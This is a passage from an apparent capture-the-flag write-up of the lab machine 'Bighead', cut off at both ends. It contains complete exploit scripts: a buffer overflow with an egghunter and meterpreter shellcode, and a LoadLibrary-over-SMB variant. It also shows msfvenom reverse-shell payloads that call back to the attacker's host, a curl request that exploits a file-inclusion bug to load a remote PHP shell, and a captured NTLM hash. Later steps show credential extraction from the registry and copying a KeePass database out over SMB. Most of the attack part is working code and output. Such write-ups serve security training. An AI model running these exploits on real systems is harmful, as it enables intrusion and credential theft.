\"\\x4a\\x7a\\xe8\\x36\\x2d\\x84\\xf0\\xc6\\xd8\\x84\\x9a\\xc2\\x4a\"payload += \"\\xd3\\x32\\xc9\\xab\\x13\\x9d\\x32\\x9e\\x20\\xda\\xcd\\x5f\\x10\"payload += \"\\x90\\xf8\\xf5\\x1c\\xce\\x04\\x1a\\x9c\\x0e\\x53\\x70\\x9c\\x66\"payload += \"\\x03\\x20\\xcf\\x93\\x4c\\xfd\\x7c\\x08\\xd9\\xfe\\xd4\\xfc\\x4a\"payload += \"\\x97\\xda\\xdb\\xbd\\x38\\x25\\x0e\\xbe\\x3f\\xd9\\xcc\\xe9\\xe7\"payload += \"\\xb1\\x2e\\xaa\\x17\\x41\\x45\\x2a\\x48\\x29\\x92\\x05\\x67\\x99\"payload += \"\\x5b\\x8c\\x20\\xb1\\xd6\\x41\\x82\\x20\\xe6\\x4b\\x42\\xfc\\xe7\"payload += \"\\x78\\x5f\\x0f\\x9d\\xf1\\x60\\xf0\\x62\\x18\\x05\\xf1\\x62\\x24\"payload += \"\\x3b\\xce\\xb4\\x1d\\x49\\x11\\x05\\x1a\\x42\\x24\\x28\\x0b\\xc9\"payload += \"\\x46\\x7e\\x4b\\xd8\"stage1 = \"POST /coffee HTTP/1.1\\r\\n\"stage1 += \"Host: dev.bighead.htb\\r\\n\"stage1 += \"Content-Length: {}\\r\\n\\r\\n\".format(len(payload))stage1 += payload + \"\\r\\n\"stage1 += \"\\r\\n\"r = remote('172.23.10.186', 8008)r.send(stage1)r.recv()r = remote('172.23.10.186', 8008)jmp_eax = \"f2125062\"align_esp = \"505C\" # push eax, pop espegghunter = \"6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7\"stage2 = align_esp + egghunter + \"9090\" + jmp_eaxr.send(\"HEAD /\" + stage2 + \" HTTP/1.1\\r\\nHost: dev.bighead.htb\\r\\n\\r\\n\")When the egghunter is scanning memory, CPU usage goes to 100% for a few seconds.When it hits the egg, it executes the meterpreter stager and we get a connection:msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (179808 bytes) to 172.23.10.186[*] Meterpreter session 1 opened (172.23.10.39:80 -&gt; 172.23.10.186:49804) at 2019-05-03 19:37:47 -0400msf5 exploit(multi/handler) &gt; sessions 1[*] Starting interaction with 1...Nice, the exploit works locally.But when I tried running it against Bighead it didn’t work so I replicated the nginx setup locally in Win7 and found that the second stage shellcode was being URL encoded by nginx. To work around this I had to fix the POST request and remove the Content-Type header so it would not URL encode the payload then switch the content body to the raw shellcode (non URL-encoded).The final exploit looks like this:#!/usr/bin/pythonfrom pwn import *import requests'''# msfvenom -p windows/meterpreter/reverse_tcp -b \\x00\\x0a\\x0d -f python LHOST=10.10.14.23 LPORT=80[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 (iteration=0)x86/shikata_ga_nai chosen with final size 368Payload size: 368 bytesFinal size of python file: 1772 bytes'''egg = \"\\x77\\x30\\x30\\x74\" # w00tpayload = egg + eggpayload += \"\\xb8\\xc3\\x06\\x6e\\xa1\\xd9\\xcd\\xd9\\x74\\x24\\xf4\\x5f\\x2b\"payload += \"\\xc9\\xb1\\x56\\x83\\xef\\xfc\\x31\\x47\\x0f\\x03\\x47\\xcc\\xe4\"payload += \"\\x9b\\x5d\\x3a\\x6a\\x63\\x9e\\xba\\x0b\\xed\\x7b\\x8b\\x0b\\x89\"payload += \"\\x08\\xbb\\xbb\\xd9\\x5d\\x37\\x37\\x8f\\x75\\xcc\\x35\\x18\\x79\"payload += \"\\x65\\xf3\\x7e\\xb4\\x76\\xa8\\x43\\xd7\\xf4\\xb3\\x97\\x37\\xc5\"payload += \"\\x7b\\xea\\x36\\x02\\x61\\x07\\x6a\\xdb\\xed\\xba\\x9b\\x68\\xbb\"payload += \"\\x06\\x17\\x22\\x2d\\x0f\\xc4\\xf2\\x4c\\x3e\\x5b\\x89\\x16\\xe0\"payload += \"\\x5d\\x5e\\x23\\xa9\\x45\\x83\\x0e\\x63\\xfd\\x77\\xe4\\x72\\xd7\"payload += \"\\x46\\x05\\xd8\\x16\\x67\\xf4\\x20\\x5e\\x4f\\xe7\\x56\\x96\\xac\"payload += \"\\x9a\\x60\\x6d\\xcf\\x40\\xe4\\x76\\x77\\x02\\x5e\\x53\\x86\\xc7\"payload += \"\\x39\\x10\\x84\\xac\\x4e\\x7e\\x88\\x33\\x82\\xf4\\xb4\\xb8\\x25\"payload += \"\\xdb\\x3d\\xfa\\x01\\xff\\x66\\x58\\x2b\\xa6\\xc2\\x0f\\x54\\xb8\"payload += \"\\xad\\xf0\\xf0\\xb2\\x43\\xe4\\x88\\x98\\x0b\\xc9\\xa0\\x22\\xcb\"payload += \"\\x45\\xb2\\x51\\xf9\\xca\\x68\\xfe\\xb1\\x83\\xb6\\xf9\\xc0\\x84\"payload += \"\\x48\\xd5\\x6a\\xc4\\xb6\\xd6\\x8a\\xcc\\x7c\\x82\\xda\\x66\\x54\"payload += \"\\xab\\xb1\\x76\\x59\\x7e\\x2f\\x7d\\xcd\\x8b\\xa5\\x8f\\x1a\\xe4\"payload += \"\\xbb\\x8f\\x24\\xa4\\x32\\x69\\x74\\x14\\x14\\x26\\x35\\xc4\\xd4\"payload += \"\\x96\\xdd\\x0e\\xdb\\xc9\\xfe\\x30\\x36\\x62\\x94\\xde\\xee\\xda\"payload += \"\\x01\\x46\\xab\\x91\\xb0\\x87\\x66\\xdc\\xf3\\x0c\\x82\\x20\\xbd\"payload += \"\\xe4\\xe7\\x32\\xaa\\x92\\x07\\xcb\\x2b\\x37\\x07\\xa1\\x2f\\x91\"payload += \"\\x50\\x5d\\x32\\xc4\\x96\\xc2\\xcd\\x23\\xa5\\x05\\x31\\xb2\\x9f\"payload += \"\\x7e\\x04\\x20\\x9f\\xe8\\x69\\xa4\\x1f\\xe9\\x3f\\xae\\x1f\\x81\"payload += \"\\xe7\\x8a\\x4c\\xb4\\xe7\\x06\\xe1\\x65\\x72\\xa9\\x53\\xd9\\xd5\"payload += \"\\xc1\\x59\\x04\\x11\\x4e\\xa2\\x63\\x21\\x89\\x5c\\xf1\\x0e\\x32\"payload += \"\\x34\\x09\\x0f\\xc2\\xc4\\x63\\x8f\\x92\\xac\\x78\\xa0\\x1d\\x1c\"payload += \"\\x80\\x6b\\x76\\x34\\x0b\\xfa\\x34\\xa5\\x0c\\xd7\\x99\\x7b\\x0c\"payload += \"\\xd4\\x01\\x8c\\x77\\x95\\xb6\\x6d\\x88\\xbf\\xd2\\x6e\\x88\\xbf\"payload += \"\\xe4\\x53\\x5e\\x86\\x92\\x92\\x62\\xbd\\xad\\xa1\\xc7\\x94\\x27\"payload += \"\\xc9\\x54\\xe6\\x6d\"data = {\"payload\": payload}proxies = {\"http\": \"http://127.0.0.1:8080\"}s = requests.Session()r = requests.Request(\"POST\", \"http://dev.bighead.htb/coffee/\", data=data)p = r.prepare()p.body = payloaddel p.headers[\"Content-Type\"]try:    s.send(p, proxies=proxies, timeout=0.2)except requests.exceptions.ReadTimeout:    passr = remote(\"10.10.10.112\", 80)jmp_eax = \"f2125062\"align_esp = \"505C\" # push eax, pop espegghunter = \"6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7\"stage2 = align_esp + egghunter + \"9090\" + jmp_eaxr.send(\"HEAD /\" + stage2 + \" HTTP/1.1\\r\\nHost: dev.bighead.htb\\r\\n\\r\\n\")Launching exploit…# python exploit.py [+] Opening connection to 10.10.10.112 on port 80: Done[*] Closed connection to 10.10.10.112 port 80msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (179808 bytes) to 10.10.10.112[*] Meterpreter session 4 opened (10.10.14.23:80 -&gt; 10.10.10.112:49306) at 2019-05-03 20:47:52 -0400msf5 exploit(multi/handler) &gt; msf5 exploit(multi/handler) &gt; sessions 4[*] Starting interaction with 4...meterpreter &gt; getuidServer username: PIEDPIPER\\NelsonExploit development (Method #2 using LoadLibrary over SMB)Instead of using an egghunter, we can also use the LoadLibrary function to load a remote DLL hosted on our machine through the Impacket SMB server. Using the debugger, I can see that the LoadLibrary is exported from bheadsrv.dll at address 0x625070C8.The function is simple and only expects a single parameter: the filename of the DLL file:HMODULE LoadLibraryA(  LPCSTR lpLibFileName);The exploit uses the same JMP EAX gadget to jump to the beginning of the buffer. Then we align the stack, and set EAX past the buffer and we push it to the stack: this will contain the address of the string of our SMB server. Finally we move the address of LoadLibrary into EBX then CALL EBX to call the function. The filename argument for LoadLibrary is popped from the stack and the DLL is then loaded.nasm &gt; add al, 0x2800000000  0428              add al,0x28nasm &gt; push eax00000000  50                push eaxnasm &gt; mov ebx, 0x62501B5800000000  BB581B5062        mov ebx,0x62501b58nasm &gt; call ebx00000000  FFD3              call ebxThe final exploit looks like this:#!/usr/bin/pythonfrom pwn import *import binasciir = remote(\"10.10.10.112\", 80)load_lib = \"\"load_lib += \"\\x80\\x04\\x28\"         # add ah, 28hload_lib += \"\\x50\"                 # push eaxload_lib += \"\\xBB\\x58\\x1B\\x50\\x62\" # 62501B58 ebx -&gt; LoadLibraryload_lib += \"\\xFF\\xD3\"             # call ebxsmb =  \"\\\\\\\\10.10.14.23\\\\share\\\\x.dll\"load_lib = binascii.hexlify(load_lib)smb = binascii.hexlify(smb)jmp_eax = \"f2125062\"align_esp = \"505C\" # push eax, pop espbuf =  align_esp + load_lib + \"90\" * 24 + jmp_eax + smbhead = \"HEAD /\" + buf + \" HTTP/1.1\\r\\n\"head += \"Host: dev.bighead.htb\\r\\n\"head += \"Connection: close\\r\\n\"head += \"\\r\\n\"r.send(head)r.close()This makes the server download a .dll from my box and execute it. So I can generate a malicious DLL with msfvenom and have the server fetch it to give me a reverse shell:# msfvenom -p windows/meterpreter/reverse_tcp -o x.dll -f dll LHOST=10.10.14.23 LPORT=4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 341 bytesFinal size of dll file: 5120 bytesSaved as: x.dllBecause the server uses SMB to talk back to us, we’ll start an SMB share with Impacket:# /usr/share/doc/python-impacket/examples/smbserver.py share .Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedFiring up the exploit…# python smbexploit.py 191HEAD /505C042850bb581b5062ffd3909090909090909090909090909090909090909090909090f21250625c5c31302e31302e31342e32335c73686172655c782e646c6c HTTP/1.1Host: dev.bighead.htbConnection: close...[*] Incoming connection (10.10.10.112,60888)[*] AUTHENTICATE_MESSAGE (PIEDPIPER\\Nelson,PIEDPIPER)[*] User Nelson\\PIEDPIPER authenticated successfully[*] Nelson::PIEDPIPER:4141414141414141:e8e4ea60eb43ad439299c50c245654ca:010100000000000000f1a060fc85d4017e4c61f17754814500000000010010004f00650051004a00490073005600450002001000730047006b007400540068006f005600030010004f00650051004a00490073005600450004001000730047006b007400540068006f0056000700080000f1a060fc85d40106000400020000000800300030000000000000000000000000200000282e2960465001d017bb89eae52e3c9002f1edefda8c004fd0186e57fb9bd3eb000000000000000000000000[*] Disconnecting Share(1:IPC$)...msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 10.10.10.112[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.112:60889) at 2018-11-26 21:53:32 -0500msf exploit(multi/handler) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; getuidServer username: PIEDPIPER\\NelsonWindows enumerationNow that I finally have a shell, I tried to get user.txt but this version is just a troll:meterpreter &gt; cat /users/nelson/desktop/user.txt    .-''-.  .-------.      .---.    .-./`)     _______   .---.  .---.           .'_ _   \\ |  _ _   \\     | ,_|    \\ .-.')   /   __  \\  |   |  |_ _|          / ( ` )   '| ( ' )  |   ,-./  )    / `-' \\  | ,_/  \\__) |   |  ( ' )         . (_ o _)  ||(_ o _) /   \\  '_ '`)   `-'`\"`,-./  )       |   '-(_{;}_)        |  (_,_)___|| (_,_).' __  &gt; (_)  )   .---. \\  '_ '`)     |      (_,_)         '  \\   .---.|  |\\ \\  |  |(  .  .-'   |   |  &gt; (_)  )  __ | _ _--.   |          \\  `-'    /|  | \\ `'   / `-'`-'|___ |   | (  .  .-'_/  )|( ' ) |   |           \\       / |  |  \\    /   |        \\|   |  `-'`-'     / (_{;}_)|   |            `'-..-'  ''-'   `'-'    `--------`'---'    `._____.'  '(_,_) '---'                   .---.       ,-----.    ,---.  ,---.   .-''-.     .-'''-.                      | ,_|     .'  .-,  '.  |   /  |   | .'_ _   \\   / _     \\                   ,-./  )    / ,-.|  \\ _ \\ |  |   |  .'/ ( ` )   ' (`' )/`--'                   \\  '_ '`) ;  \\  '_ /  | :|  | _ |  |. (_ o _)  |(_ o _).                       &gt; (_)  ) |  _`,/ \\ _/  ||  _( )_  ||  (_,_)___| (_,_). '.                    (  .  .-' : (  '\\_/ \\   ;\\ (_ o._) /'  \\   .---..---.  \\  :                    `-'`-'|___\\ `\"/  \\  ) /  \\ (_,_) /  \\  `-'    /\\    `-'  |                     |        \\'. \\_/``\".'    \\     /    \\       /  \\       /                      `--------`  '-----'       `---`      `'-..-'    `-...-'                             ,---------. .---.  .---.     .-''-.                                           \\          \\|   |  |_ _|   .'_ _   \\                                           `--.  ,---'|   |  ( ' )  / ( ` )   '                                             |   \\   |   '-(_{;}_). (_ o _)  |                                             :_ _:   |      (_,_) |  (_,_)___|                                             (_I_)   | _ _--.   | '  \\   .---.                                            (_(=)_)  |( ' ) |   |  \\  `-'    /                                             (_I_)   (_{;}_)|   |   \\       /                                              '---'   '(_,_) '---'    `'-..-'                                                        .---.  .---.    ____       .-'''-. .---.  .---.        .-,                    |   |  |_ _|  .'  __ `.   / _     \\|   |  |_ _|     ,-.|  \\ _                 |   |  ( ' ) /   '  \\  \\ (`' )/`--'|   |  ( ' )     \\  '_ /  |                |   '-(_{;}_)|___|  /  |(_ o _).   |   '-(_{;}_)    _`,/ \\ _/                 |      (_,_)    _.-`   | (_,_). '. |      (_,_)    (  '\\_/ \\                  | _ _--.   | .'   _    |.---.  \\  :| _ _--.   |     `\"/  \\  )                 |( ' ) |   | |  _( )_  |\\    `-'  ||( ' ) |   |       \\_/``\"                  (_{;}_)|   | \\ (_ o _) / \\       / (_{;}_)|   |                               '(_,_) '---'  '.(_,_).'   `-...-'  '(_,_) '---'  Doing some enumeration next…System info:meterpreter &gt; getuidServer username: PIEDPIPER\\Nelsonmeterpreter &gt; sysinfoComputer        : PIEDPIPEROS              : Windows 2008 (Build 6002, Service Pack 2).Architecture    : x86System Language : en_GBDomain          : DEVELOPMENTLogged On Users : 5Meterpreter     : x86/windowsInstalled programs:Notice SSH is installed, 7-Zip and Keepass.meterpreter &gt; run post/windows/gather/enum_applications [*] Enumerating applications installed on PIEDPIPERInstalled Applications====================== Name                                                              Version ----                                                              ------- 7-Zip 18.05                                                       18.05 Bitnami TestLink Module                                           1.9.17-0 Bitvise SSH Server 7.44 (remove only)                             7.44 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB953595)            1 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB958484)            1 KeePass Password Safe 2.40                                        2.40 Microsoft .NET Framework 3.5 SP1                                  3.5.30729 Microsoft .NET Framework 4.5.2                                    4.5.51209 Microsoft .NET Framework 4.5.2                                    4.5.51209 Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022         9.0.21022 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161    9.0.30729.6161 Mozilla Firefox 52.9.0 ESR (x86 en-GB)                            52.9.0 Notepad++ (32-bit x86)                                            7.5.9 Oracle VM VirtualBox Guest Additions 5.2.12                       5.2.12.0 Python 2.7.15                                                     2.7.15150 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2604111)  1 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2736416)  1 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2840629)  1 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2861697)  1 Update for Microsoft .NET Framework 3.5 SP1 (KB963707)            1 Update for Microsoft .NET Framework 4.5.2 (KB4040977)             1 Update for Microsoft .NET Framework 4.5.2 (KB4096495)             1 Update for Microsoft .NET Framework 4.5.2 (KB4098976)             1 Update for Microsoft .NET Framework 4.5.2 (KB4338417)             1 Update for Microsoft .NET Framework 4.5.2 (KB4344149)             1 Update for Microsoft .NET Framework 4.5.2 (KB4457019)             1 Update for Microsoft .NET Framework 4.5.2 (KB4457038)             1 Update for Microsoft .NET Framework 4.5.2 (KB4459945)             1 VMware Tools                                                      10.1.15.6677369 XAMPP                                                             5.6.36-0A local service is also listening on port 2020:C:\\nginx&gt;netstat -annetstat -anActive Connections  Proto  Local Address          Foreign Address        State  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING  TCP    0.0.0.0:2020           0.0.0.0:0              LISTENINGTo access it remotely we can use the portfwd command within meterpreter:meterpreter &gt; portfwd add -l 2020 -p 2020 -r 127.0.0.1[*] Local TCP relay created: :2020 &lt;-&gt; 127.0.0.1:2020It’s some kind of SSH server: Bitvise SSH Server (WinSSHD)# nc -nv 127.0.0.1 2020Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Connected to 127.0.0.1:2020.SSH-2.0-7.44 FlowSsh: Bitvise SSH Server (WinSSHD) 7.44: free only for personal non-commercial useI don’t have the credentials so I looked for a while in the registry and eventually found a needle in the haystack.meterpreter &gt; search -f *nginx*Found 14 results...    c:\\nginx\\nginx.exe (3115008 bytes)    c:\\nginx\\conf\\nginx-orig.conf (2773 bytes)    c:\\nginx\\conf\\nginx.conf (6608 bytes)    c:\\nginx\\conf\\nginx.conf_bkp (4525 bytes)    c:\\nginx\\contrib\\geo2nginx.pl (1272 bytes)    c:\\nginx\\contrib\\unicode2nginx\\unicode-to-nginx.pl (1090 bytes)    c:\\nginx\\contrib\\vim\\ftdetect\\nginx.vim (198 bytes)    c:\\nginx\\contrib\\vim\\ftplugin\\nginx.vim (29 bytes)    c:\\nginx\\contrib\\vim\\indent\\nginx.vim (250 bytes)    c:\\nginx\\contrib\\vim\\syntax\\nginx.vim (125645 bytes)    c:\\nginx\\logs\\nginx.pid (6 bytes)    c:\\ProgramData\\Microsoft\\User Account Pictures\\nginx.dat    c:\\Users\\All Users\\Microsoft\\User Account Pictures\\nginx.dat    c:\\Windows\\System32\\nginx.reg (4268 bytes)The nginx.reg stands out:C:\\users\\nelson&gt;type c:\\Windows\\System32\\nginx.regtype c:\\Windows\\System32\\nginx.regWindows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx]\"Type\"=dword:00000010\"Start\"=dword:00000002\"ErrorControl\"=dword:00000001\"ImagePath\"=hex(2):43,00,3a,00,5c,00,50,00,72,00,6f,00,67,00,72,00,61,00,6d,00,\\  20,00,46,00,69,00,6c,00,65,00,73,00,5c,00,6e,00,73,00,73,00,6d,00,5c,00,77,\\  00,69,00,6e,00,33,00,32,00,5c,00,6e,00,73,00,73,00,6d,00,2e,00,65,00,78,00,\\  65,00,00,00\"DisplayName\"=\"Nginx\"\"ObjectName\"=\".\\\\nginx\"\"Description\"=\"Nginx web server and proxy.\"\"DelayedAutostart\"=dword:00000000\"FailureActionsOnNonCrashFailures\"=dword:00000001\"FailureActions\"=hex:00,00,00,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\\  00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00\"Authenticate\"=hex:48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00\"PasswordHash\"=\"336d72676e6333205361797a205472794861726465722e2e2e203b440a\"[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx\\Parameters]\"Application\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6e,\\  00,67,00,69,00,6e,00,78,00,2e,00,65,00,78,00,65,00,00,00\"AppParameters\"=hex(2):00,00\"AppDirectory\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,00,00\"AppStdin\"=hex(2):73,00,74,00,61,00,72,00,74,00,20,00,6e,00,67,00,69,00,6e,00,\\  78,00,00,00\"AppStdout\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\\  6f,00,67,00,73,00,5c,00,73,00,65,00,72,00,76,00,69,00,63,00,65,00,2e,00,6f,\\  00,75,00,74,00,2e,00,6c,00,6f,00,67,00,00,00\"AppStderr\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\\  6f,00,67,00,73,00,5c,00,65,00,72,00,72,00,6f,00,72,00,2e,00,6c,00,6f,00,67,\\  00,00,00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx\\Parameters\\AppExit]@=\"Restart\"[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx\\Enum]\"0\"=\"Root\\\\LEGACY_NGINX\\\\0000\"\"Count\"=dword:00000001\"NextInstance\"=dword:00000001The Authenticate key contains: 48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00I like using Cyberchef to decode and convert data, it’s much faster to try different filters/conversion than coding it in python.Password: H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87I can now SSH in with user nginx but I’m stuck in some sort of limited shell:# ssh -p 2020 nginx@127.0.0.1nginx@127.0.0.1's password: --&gt; `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`bvshell:/$ whoamiwhoami: Command not found.bvshell:/$ pwd/bvshell:/$ lsanonymous             apache                apache_start.bat      apache_stop.bat       apps                  catalina_service.bat  catalina_start.bat    catalina_stop.bat     cgi-bincontrib               ctlscript.bat         FileZillaFTP          filezilla_setup.bat   filezilla_start.bat   filezilla_stop.bat    htdocs                img                   installlicenses              locale                mailoutput            mailtodisk            MercuryMail           mercury_start.bat     mercury_stop.bat      mysql                 mysql_start.batmysql_stop.bat        nginx.exe             passwords.txt         perl                  php                   phpMyAdmin            properties.ini        readme_de.txt         readme_en.txtRELEASENOTES          sendmail              service.exe           setup_xampp.bat       src                   test_php.bat          tmp                   tomcat                uninstall.datuninstall.exe         user.txt              webalizer             webdav                xampp-control.exe     xampp-control.ini     xampp-control.log     xampp_shell.bat       xampp_start.exexampp_stop.exeI checked out the Bitvise website for information on bvshell and saw that it’s some kind of chroot jail:That would explain why the above directory listing of the root directory shows the content of xampp and not the root of the Windows server.There’s a user.txt file in the directory but I can’t seem to read it.bvshell:/$ cat user.txt-bvshell: Reading binary file as a text.Local File IncludeThe Testlink application is located in /apps/testlink/htdocs.The linkto.php file contains an LFI, the important code is shown below:// alpha 0.0.1 implementation of our new pipercoin authentication tech// full API not done yet. just submit tokens with requests for now.if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php        $PiperCoinSess = base64_decode($PiperCoinAuth);\t\t\t\t$PiperCoinAvitar = (string)$PiperCoinSess;}[...]  require_once($PiperCoinAuth); When I do a GET request on linkto.php, I get the following error message:Fatal error: require_once(): Failed opening required '' (include_path='C:\\xampp\\php\\PEAR;.;C:\\xampp\\apps\\testlink\\htdocs\\lib\\functions\\;C:\\xampp\\apps\\testlink\\htdocs\\lib\\issuetrackerintegration\\;C:\\xampp\\apps\\testlink\\htdocs\\lib\\codetrackerintegration\\;C:\\xampp\\apps\\testlink\\htdocs\\lib\\reqmgrsystemintegration\\;C:\\xampp\\apps\\testlink\\htdocs\\third_party\\') in C:\\xampp\\apps\\testlink\\htdocs\\linkto.php on line 62The linkto.php has a require_once($PiperCoinAuth) command, and because $PiperCoinAuth is under direct control of users through the POST PiperCoinID parameter, we can include any arbitrary PHP file.I generated a PHP meterpreter payload.# msfvenom -p php/meterpreter/reverse_tcp -o met.php LHOST=10.10.14.23 LPORT=4444[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1112 bytesSaved as: met.phpThen sent a POST request to execute PHP code through my SMB server# curl -XPOST --data \"PiperID=1&amp;PiperCoinID=\\\\\\\\10.10.14.23\\share\\met.php\" http://code.bighead.htb/testlink/linkto.phpFinally, I get a proper shell as SYSTEM on the target systemmsf5 exploit(multi/handler) &gt; [*] Encoded stage with php/base64[*] Sending encoded stage (51106 bytes) to 10.10.10.112[*] Meterpreter session 4 opened (10.10.14.23:4444 -&gt; 10.10.10.112:49159) at 2019-05-02 21:06:18 -0400msf5 exploit(multi/handler) &gt; sessions 4[*] Starting interaction with 4...meterpreter &gt; getuidServer username: SYSTEM (0)Got user flag:meterpreter &gt; cat /users/nginx/desktop/user.txt5f158a...Getting root.txt from KeepassThe root.txt is yet another troll:meterpreter &gt; cat /users/administrator/desktop/root.txt                    * * *              Gilfoyle's Prayer     ___________________6666666___________________ ____________66666__________66666_____________ _________6666___________________666__________ _______666__6____________________6_666_______ _____666_____66_______________666____66______ ____66_______66666_________66666______666____ ___66_________6___66_____66___66_______666___ __66__________66____6666_____66_________666__ _666___________66__666_66___66___________66__ _66____________6666_______6666___________666_ _66___________6666_________6666__________666_ _66________666_________________666_______666_ _66_____666______66_______66______666____666_ _666__666666666666666666666666666666666__66__ __66_______________6____66______________666__ ___66______________66___66_____________666___ ____66______________6__66_____________666____ _______666___________666___________666_______ _________6666_________6_________666__________ ____________66666_____6____66666_____________ ___________________6666666________________   Prayer for The Praise of Satan's Kingdom              Praise, Hail Satan!   Glory be to Satan the Father of the Earth       and to Lucifer our guiding light    and to Belial who walks between worlds     and to Lilith the queen of the night    As it was in the void of the beginning                   Is now, and ever shall be, Satan's kingdom without End                so it is done.                    * * *When I started a shell my PHP meterpreter kept dropping so I used the multi/manage/upload_exec metasploit module to upload an .exe meterpreter and get another meterpreter session. This time I could spawn a shell without losing access.msf5 post(multi/manage/upload_exec) &gt; run[*] Uploading /root/htb/bighead/met.exe to met.exe[*] Executing command: met.exe[*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (179808 bytes) to 10.10.10.112[*] Meterpreter session 7 opened (10.10.14.23:5555 -&gt; 10.10.10.112:49167) at 2019-05-02 21:19:51 -0400meterpreter &gt; shellProcess 3316 created.Channel 1 created.Microsoft Windows [Version 6.0.6002]Copyright (c) 2006 Microsoft Corporation.  All rights reserved.C:\\xampp\\apps\\testlink\\htdocs&gt;whoamiwhoamint authority\\systemThe administrator’s C:\\Users\\Administrator\\AppData\\Roaming\\KeePass directory contains a Keepass configuration file: keepass.config.xml. It contains the name of the last keyfile used : admin.png and the database file: root.txt. Notice that the file name is root.txt:Zone.Identifier and not just root.txt so this means we are looking at NTFS alternate data streams here.[...]&lt;Association&gt;&lt;DatabasePath&gt;..\\..\\Users\\Administrator\\Desktop\\root.txt:Zone.Identifier&lt;/DatabasePath&gt;&lt;Password&gt;true&lt;/Password&gt;&lt;KeyFilePath&gt;..\\..\\Users\\Administrator\\Pictures\\admin.png&lt;/KeyFilePath&gt;&lt;/Association&gt;[...]We can check this by doing dir /r in the Desktop folder and we can see:C:\\Users\\Administrator\\Desktop&gt;dir /ahdir /ah Volume in drive C has no label. Volume Serial Number is 7882-4E78 Directory of C:\\Users\\Administrator\\Desktop06/10/2018  14:33             1,519 root.txt               1 File(s)          1,519 bytes               0 Dir(s)  16,316,542,976 bytes freeC:\\Users\\Administrator\\Desktop&gt;dir /r /ahdir /r /ah Volume in drive C has no label. Volume Serial Number is 7882-4E78 Directory of C:\\Users\\Administrator\\Desktop06/10/2018  14:33             1,519 root.txt                              7,294 root.txt:Zone.Identifier:$DATA               1 File(s)          1,519 bytes               0 Dir(s)  16,316,542,976 bytes freeBecause the box only has powershell version 2, I can’t use the -stream flag to extract the ADS. But I found by pure luck that copying the file over SMB will automatically extract the data stream and create two files on my VM:C:\\Users\\Administrator\\Desktop&gt;attrib -h root.txtC:\\Users\\Administrator\\Desktop&gt;copy root.txt \\\\10.10.14.23\\share        1 file(s) copied.[...]-rwxr-xr-x  1 root root   1519 Dec 31  1969 root.txt-rwxr-xr-x  1 root root   7294 Oct  6 10:33 root.txt:Zone.IdentifierI also copied the keyfile admin.png, then renamed root.txt:Zone.Identifier file to a .kdbx extension:C:\\Users\\Administrator\\Desktop&gt;copy ..\\pictures\\admin.png \\\\10.10.14.23\\sharecopy ..\\pictures\\admin.png \\\\10.10.14.23\\share        1 file(s) copied.# file root.kdbx root.kdbx: Keepass password database 2.x KDBXWhen I tried to use keepass2john it didn’t work and just aborted without extracting the hash:# keepass2john -k admin.png root.kdbxadmin.pngAbortedKeepass uses the sha256 hash of the keyfile mixed with the password to produce the hash. In this case though the 